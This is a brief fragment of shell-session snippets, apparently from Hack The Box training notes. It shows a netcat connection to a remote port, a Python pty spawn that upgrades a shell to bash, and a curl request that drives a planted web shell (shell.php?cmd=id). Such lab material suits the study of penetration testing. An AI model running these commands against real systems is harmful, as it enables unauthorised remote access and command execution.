...
```shell-session
LeDaav@htb[/htb]$ nc 10.10.10.1 1234
...
```shell-session
LeDaav@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```
...
```shell-session
LeDaav@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id
